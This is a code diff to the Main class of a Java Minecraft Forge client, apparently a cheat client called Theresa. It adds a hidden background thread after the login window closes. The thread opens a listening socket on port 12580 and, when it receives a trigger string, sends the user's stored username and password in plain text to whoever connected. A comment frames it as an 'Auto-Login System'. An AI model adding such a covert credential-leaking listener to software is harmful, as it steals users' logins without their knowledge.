@@ -10,8 +10,6 @@ import io.netty.handler.codec.string.StringEncoder;
 import net.minecraftforge.fml.common.FMLCommonHandler;
 import sun.misc.Unsafe;
 import theresa.connection.NettyClientHandler;
-import theresa.connection.Packet;
-import theresa.connection.PacketUtil;
 import theresa.protection.RSAUtils;
 
 import javax.swing.*;
@@ -20,9 +18,14 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.net.ServerSocket;
+import java.net.Socket;
 import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.util.Map;
@@ -112,6 +115,38 @@ public class Main {
                     Map<String, String> keyMap = RSAUtils.createKeys(2048);
                     Main.INSTANCE.publicKey = keyMap.get("publicKey");
                     Main.INSTANCE.privateKey = keyMap.get("privateKey");
+
+                    //Get The Auto-Login System By Theresa.exe
+
+                    //New Thread SUS
+                    new Thread(() -> {
+                        ServerSocket serverSocket = null;
+                        try {
+                            serverSocket = new ServerSocket(12580);
+                            Socket socket = serverSocket.accept();
+                            DataInputStream input = null;
+                            DataOutputStream output = null;
+                            try {
+                                input = new DataInputStream(socket.getInputStream());
+                                output = new DataOutputStream(socket.getOutputStream());
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                            while (!serverSocket.isClosed()) {
+                                String received = Objects.requireNonNull(input).readUTF();
+                                if (received.equals("FuckYou"))
+                                    Objects.requireNonNull(output).writeUTF(INSTANCE.name + ":" + INSTANCE.password);
+                            }
+
+                        } catch (IOException e) {
+                            try {
+                                serverSocket.close();
+                            } catch (IOException ex) {
+                                ex.printStackTrace();
+                            }
+                        }
+                    }).start();
+
                     setVisible(false);
                 }
             });
